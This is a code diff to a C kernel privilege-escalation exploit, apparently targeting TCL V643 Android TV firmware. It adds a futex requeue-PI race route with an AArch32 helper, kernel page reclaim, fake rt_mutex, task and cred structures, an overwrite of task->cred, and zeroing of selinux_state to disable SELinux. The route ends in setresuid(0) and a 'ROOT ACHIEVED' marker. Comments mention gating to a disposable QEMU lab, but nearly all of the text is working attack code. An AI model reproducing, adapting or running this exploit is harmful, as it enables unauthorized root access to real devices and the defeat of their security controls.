@@ -9,12 +9,26 @@
 #include "offsets.h"
 #include <sys/ioctl.h>
 #include <sys/mman.h>
+#ifdef __ANDROID__
 #include <sys/system_properties.h>
+#else
+#define PROP_VALUE_MAX 92
+static inline int __system_property_get(const char *name, char *value) {
+  const char *v = getenv(name);
+  if (!v) { value[0] = 0; return 0; }
+  size_t n = strlen(v);
+  if (n >= PROP_VALUE_MAX) n = PROP_VALUE_MAX - 1;
+  memcpy(value, v, n);
+  value[n] = 0;
+  return (int)n;
+}
+#endif
 #include <linux/perf_event.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/utsname.h>
+#include "tcl_v643/mcast_helper_protocol.h"
 
 const struct kernel_offsets *active_offsets = NULL;
 
@@ -65,9 +79,12 @@ static int print_profile_info(const char *release_override) {
       break;
   }
   printf("stack_overlay_route=%s\n", stack_route);
-  printf("reclaim_route=%s\n",
-         profile->reclaim_route == GHOST_RECLAIM_TCL_V643_UNPROVEN ?
-             "tcl-v643-unproven" : "reference-sabrina");
+  const char *reclaim_route = "reference-sabrina";
+  if (profile->reclaim_route == GHOST_RECLAIM_TCL_V643_UNPROVEN)
+    reclaim_route = "tcl-v643-unproven";
+  else if (profile->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT)
+    reclaim_route = "tcl-v643-exact";
+  printf("reclaim_route=%s\n", reclaim_route);
   printf("analysis_blocker=%s\n",
          profile->analysis_blocker ? profile->analysis_blocker : "");
   printf("kimage_text_base=0x%016llx\n",
@@ -96,14 +113,33 @@ static int select_offsets(void) {
   struct utsname uts;
   if (uname(&uts) < 0) return -1;
   pr_info("kernel: %s\n", uts.release);
-  const struct kernel_offsets *candidate = find_offsets_for_release(uts.release);
+  const char *profile_release = uts.release;
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+  /* The source-built disposable QEMU kernel omits Android's localversion
+   * suffix although it is built from the exact V643 tree/config.  Only the
+   * explicitly armed lab target accepts this override. */
+  const char *lab_release = getenv("TCL_V643_LAB_RELEASE");
+  if (lab_release && lab_release[0]) profile_release = lab_release;
+#endif
+  const struct kernel_offsets *candidate = find_offsets_for_release(profile_release);
   if (candidate) {
       if (candidate->analysis_only) {
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+        if (candidate->stack_overlay_route ==
+                GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT &&
+            candidate->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT) {
+          pr_warning("LAB ARMING: accepting integrated TCL V643 profile; "
+                     "this build must not be run on the TV before the "
+                     "uninstrumented QEMU gate passes\n");
+        } else
+#endif
+        {
         pr_error("profile is analysis-only: %s\n",
                  candidate->analysis_blocker ? candidate->analysis_blocker :
                  "required values are not proven");
         pr_error("refusing to arm any kernel primitive\n");
         return -1;
+        }
       }
       active_offsets = candidate;
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
@@ -551,8 +587,269 @@ void reset_main_route_state(void) {
   cfi_last_step = 0; cfi_last_errno = 0;
 }
 
+/* Exact V643 stack carrier: an AArch32 helper owns the stale waiter while
+ * this AArch64 coordinator owns the PI-cycle owner and priority-change
+ * consumer.  One helper lifetime is intentionally limited to one rb_erase.
+ * QEMU showed that a second walk over the residual waiter is not stable. */
+struct tcl_split_run {
+  struct tcl_v643_mcast_shared *shared;
+  pid_t helper_pid;
+};
+
+extern int g_route_write_ok;
+extern int g_selinux_off;
+extern int g_hit_block;
+
+static int wait_atomic_nonzero(_Atomic uint32_t *word, int timeout_ms) {
+  for (int i = 0; i < timeout_ms; i++) {
+    if (atomic_load_explicit(word, memory_order_acquire)) return 1;
+    usleep(1000);
+  }
+  return 0;
+}
+
+static void tcl_quiesce_payload(void) {
+  for (int b = 0; ; b++) {
+    uint8_t *pg = uring_block(b);
+    if (!pg) break;
+    *(volatile uint32_t *)(pg + LOCK_OFF) = 0;
+    *(volatile uint32_t *)(pg + FAKE_TASK_OFF +
+                           FAKE_TASK_PI_LOCK_OFF) = 0;
+    *(volatile uint64_t *)(pg + W0_OFF + 0x08) = 0;
+    *(volatile uint64_t *)(pg + W0_OFF + 0x10) = 0;
+    *(volatile uint64_t *)(pg + W0_OFF +
+                           FAKE_WAITER_PI_TREE_ENTRY_OFF + 8) = 0;
+    *(volatile uint64_t *)(pg + W0_OFF +
+                           FAKE_WAITER_PI_TREE_ENTRY_OFF + 16) = 0;
+    *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF) = 0;
+    *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8) = 0;
+    *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_OWNER_OFF) = 0;
+    *(volatile uint64_t *)(pg + FAKE_TASK_OFF +
+                           FAKE_TASK_PI_WAITERS_OFF) = 0;
+    *(volatile uint64_t *)(pg + FAKE_TASK_OFF +
+                           FAKE_TASK_PI_WAITERS_OFF + 8) = 0;
+    *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_USAGE_OFF) = 0x100;
+    *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_UID_OFF) = 0;
+    *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_GID_OFF) = 0;
+  }
+  atomic_thread_fence(memory_order_seq_cst);
+}
+
+static void *tcl_split_owner(void *opaque) {
+  struct tcl_split_run *run = opaque;
+  struct tcl_v643_mcast_shared *s = run->shared;
+  disable_rseq_for_thread();
+  if (futex_op(&s->f_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    atomic_fetch_add(&s->failures, 1);
+    return NULL;
+  }
+  while (!atomic_load(&s->waiter_ready)) sched_yield();
+  atomic_store(&s->owner_started, 1);
+  if (futex_op(&s->f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    atomic_fetch_add(&s->failures, 1);
+  else
+    (void)futex_op(&s->f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  (void)futex_op(&s->f_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  return NULL;
+}
+
+static void *tcl_split_consumer(void *opaque) {
+  struct tcl_split_run *run = opaque;
+  struct tcl_v643_mcast_shared *s = run->shared;
+  disable_rseq_for_thread();
+  pin_to_core(CONSUMER_CORE);
+  if (!wait_atomic_nonzero(&s->round_go, 5000)) {
+    atomic_fetch_add(&s->failures, 1);
+    atomic_store(&s->round_done, 1);
+    return NULL;
+  }
+
+  uint8_t *first = uring_block(0);
+  uint64_t armed = first ? *(volatile uint64_t *)(
+      first + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF) : 0;
+  errno = 0;
+  long sr = sched_setattr_tid((int)atomic_load(&s->helper_tid), 7);
+  int found = -1;
+  uint64_t cleared = page_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF;
+  for (int b = 0; ; b++) {
+    uint8_t *pg = uring_block(b);
+    if (!pg) break;
+    uint64_t pc = *(volatile uint64_t *)(
+        pg + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+    if (pc == cleared && armed != cleared) {
+      found = b;
+      break;
+    }
+  }
+  if (sr == 0 && found >= 0) {
+    if (pselect_custom_write == 5) {
+      uint8_t *hit = uring_block(found);
+      uint64_t got = *(volatile uint64_t *)(hit + SELFTEST_OFF);
+      uint64_t want = page_base + SELFTEST_VALUE;
+      if (got != want) {
+        pr_error("TCL split: self-test write got=%016llx want=%016llx\n",
+                 (unsigned long long)got, (unsigned long long)want);
+        found = -1;
+      }
+    }
+  }
+  if (sr == 0 && found >= 0) {
+    g_hit_block = found;
+    atomic_store(&s->erase_landed, 1);
+    atomic_store(&consumer_erase_hits, 1);
+    g_route_write_ok = 1;
+  } else {
+    atomic_fetch_add(&s->failures, 1);
+  }
+
+  tcl_quiesce_payload();
+  if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
+    int efd = (int)syscall(__NR_openat, AT_FDCWD,
+                           "/sys/fs/selinux/enforce", O_RDONLY, 0);
+    if (efd >= 0) {
+      char value = '?';
+      if (syscall(__NR_read, efd, &value, 1) == 1 && value == '0')
+        g_selinux_off = 1;
+      syscall(__NR_close, efd);
+    }
+  }
+  atomic_store_explicit(&s->round_done, 1, memory_order_release);
+  return NULL;
+}
+
+static int tcl_create_shared(struct tcl_v643_mcast_shared **out, int *out_fd) {
+  int fd = (int)syscall(__NR_memfd_create, "tcl-v643-mcast", 0);
+  if (fd < 0 || ftruncate(fd, sizeof(**out)) != 0) {
+    if (fd >= 0) close(fd);
+    return 0;
+  }
+  struct tcl_v643_mcast_shared *s = mmap(
+      NULL, sizeof(*s), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (s == MAP_FAILED) {
+    close(fd);
+    return 0;
+  }
+  memset(s, 0, sizeof(*s));
+  s->message.magic = TCL_V643_MCAST_HELPER_MAGIC;
+  s->message.version = TCL_V643_MCAST_HELPER_VERSION;
+  s->message.size = sizeof(s->message);
+  s->message.fake_task = fake_task;
+  s->message.fake_lock = fake_lock;
+  s->message.wake_state = 3;
+  s->message.prio = 1;
+  *out = s;
+  *out_fd = fd;
+  return 1;
+}
+
+static int run_tcl_v643_split_route(void) {
+  struct tcl_split_run run = {0};
+  pthread_t owner, consumer;
+  int fd = -1, status = 0;
+  const char *helper = getenv("TCL_MCAST_HELPER");
+  if (!helper || !helper[0])
+    helper = "/data/local/tmp/tcl-v643-mcast-helper";
+  if (!tcl_create_shared(&run.shared, &fd)) {
+    pr_error("TCL split: shared object failed errno=%d\n", errno);
+    return 0;
+  }
+
+  run.helper_pid = fork();
+  if (run.helper_pid == 0) {
+    char fdarg[16];
+    snprintf(fdarg, sizeof(fdarg), "%d", fd);
+    fcntl(fd, F_SETFD, 0);
+    execl(helper, helper, "--run-fd", fdarg, NULL);
+    _exit(127);
+  }
+  if (run.helper_pid < 0 ||
+      !wait_atomic_nonzero(&run.shared->helper_ready, 5000)) {
+    pr_error("TCL split: AArch32 helper did not become ready\n");
+    goto fail;
+  }
+  if (pthread_create(&owner, NULL, tcl_split_owner, &run) != 0 ||
+      pthread_create(&consumer, NULL, tcl_split_consumer, &run) != 0) {
+    pr_error("TCL split: coordinator thread creation failed\n");
+    goto fail;
+  }
+  if (!wait_atomic_nonzero(&run.shared->waiter_waiting, 5000)) {
+    pr_error("TCL split: helper waiter did not enter WAIT_REQUEUE_PI\n");
+    goto fail_threads;
+  }
+  for (int i = 0; i < 2000 && !(run.shared->f_chain & FUTEX_WAITERS); i++)
+    usleep(1000);
+  if (!(run.shared->f_chain & FUTEX_WAITERS)) {
+    pr_error("TCL split: owner is not queued on chain futex\n");
+    goto fail_threads;
+  }
+  usleep(50000);
+  errno = 0;
+  long rr = futex_op(&run.shared->f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                     (void *)1, &run.shared->f_target, 0);
+  if (rr != -1 || errno != EDEADLK) {
+    pr_error("TCL split: CMP_REQUEUE_PI ret=%ld errno=%d, not armed\n",
+             rr, errno);
+    goto fail_threads;
+  }
+  atomic_store(&run.shared->bug_armed, 1);
+  if (syscall(__NR_tgkill, run.helper_pid,
+              (pid_t)atomic_load(&run.shared->helper_tid), SIGUSR1) != 0) {
+    pr_error("TCL split: tgkill helper failed errno=%d\n", errno);
+    goto fail_threads;
+  }
+
+  pthread_join(consumer, NULL);
+  pthread_join(owner, NULL);
+  waitpid(run.helper_pid, &status, 0);
+  run.helper_pid = 0;
+  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0 &&
+           atomic_load(&run.shared->erase_landed) &&
+           atomic_load(&run.shared->handler_done) &&
+           atomic_load(&run.shared->cleanup_done) &&
+           !atomic_load(&run.shared->failures);
+  pr_info("TCL split: erase=%u handler=%u cleanup=%u status=%d failures=%u\n",
+          atomic_load(&run.shared->erase_landed),
+          atomic_load(&run.shared->handler_done),
+          atomic_load(&run.shared->cleanup_done), status,
+          atomic_load(&run.shared->failures));
+  munmap(run.shared, sizeof(*run.shared));
+  close(fd);
+  return ok;
+
+fail_threads:
+  atomic_fetch_add(&run.shared->failures, 1);
+  atomic_store(&run.shared->round_done, 1);
+fail:
+  if (run.helper_pid > 0) {
+    kill(run.helper_pid, SIGKILL);
+    waitpid(run.helper_pid, NULL, 0);
+  }
+  munmap(run.shared, sizeof(*run.shared));
+  close(fd);
+  return 0;
+}
+
 void run_main_route_threads(void) {
   reset_main_route_state();
+  if (active_offsets &&
+      active_offsets->stack_overlay_route ==
+          GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT) {
+    if (!run_tcl_v643_split_route()) {
+      g_route_write_ok = 0;
+      return;
+    }
+    if (pselect_custom_write == WRITE_MODE_CRED) {
+      long gr = syscall(__NR_setresgid, 0, 0, 0);
+      long ur = syscall(__NR_setresuid, 0, 0, 0);
+      if (gr != 0 || ur != 0 || syscall(__NR_getuid) != 0) {
+        pr_error("TCL split: credential normalization failed gid=%ld uid=%ld errno=%d\n",
+                 gr, ur, errno);
+        g_route_write_ok = 0;
+      }
+    }
+    atomic_store(&consumer_walks_done, 1);
+    return;
+  }
   /* Install the in-handler overlay route (walk-before-cleanup): the
    * handler runs on whichever thread receives the thread-directed
    * SIGUSR1 (main sends it to the waiter tid right after the CMP_REQUEUE_PI
@@ -738,13 +1035,15 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
-  if (mode == 6) {
+  if (mode == 6 && (!active_offsets ||
+      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
     /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
     ghost_push_plan(pselect_custom_target - 8, page_base + FAKE_CRED_OFF);
     pr_info("  walk0: cred, walk1: real_cred, fake_cred=%016zx plans=%d\n",
             page_base + FAKE_CRED_OFF, ghost_plan_count());
   }
-  if (mode == WRITE_MODE_CRED_SELINUX) {
+  if (mode == WRITE_MODE_CRED_SELINUX && (!active_offsets ||
+      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
     /* Plan 0 is baked into the payload by prepare_skb_payload as the
      * selinux zero-write (W0.pi_tree = {pc=(selinux-8)|1, right=0,
      * left=0}). Push the two cred plans for the following overlay
@@ -2175,12 +2474,31 @@ static int run_cred_swap(void) {
     if (env_flag("CRED_SLAB_DRAIN", 0))
       slab_drain();
     g_consumer_task = 0;
-    /* Mode 7 targets selinux_state first (the cred plans are pushed
-     * inside do_one_write); mode 6 targets task->cred directly. */
-    if (!do_one_write(selinux_mode ? g_selinux_target
-                                   : g_leaked_task + TASK_CRED_OFF,
-                      selinux_mode ? "selinux+cred swap" : "cred swap",
-                      selinux_mode ? WRITE_MODE_CRED_SELINUX : 6)) continue;
+    /* TCL uses two independent one-erase cycles.  Rewalking the residual
+     * waiter for SELinux + cred + real_cred was the remaining unstable
+     * route.  First zero selinux_state, verify selinuxfs, then reclaim a
+     * fresh page and install task->cred.  setresgid/setresuid in the split
+     * coordinator makes the kernel commit a normal cred to both pointers. */
+    if (selinux_mode && active_offsets->reclaim_route ==
+                            GHOST_RECLAIM_TCL_V643_EXACT) {
+      if (!do_one_write(g_selinux_target, "selinux zero",
+                        WRITE_MODE_CRED_SELINUX) ||
+          !g_route_write_ok || !check_selinux_off()) {
+        pr_warning("TCL SELinux cycle did not verify enforce=0\n");
+        continue;
+      }
+      g_selinux_off = 1;
+      if (!do_one_write(g_leaked_task + TASK_CRED_OFF, "cred swap",
+                        WRITE_MODE_CRED))
+        continue;
+    } else {
+      if (!do_one_write(selinux_mode ? g_selinux_target
+                                     : g_leaked_task + TASK_CRED_OFF,
+                        selinux_mode ? "selinux+cred swap" : "cred swap",
+                        selinux_mode ? WRITE_MODE_CRED_SELINUX :
+                                       WRITE_MODE_CRED))
+        continue;
+    }
     uint32_t uid_now = syscall(__NR_getuid);
     if (g_route_write_ok && (uid_now == 0 || uid_now == 0xffffff80u)) {
       /* ============ ROOT ACHIEVED - raw syscalls ONLY from here on ===== */
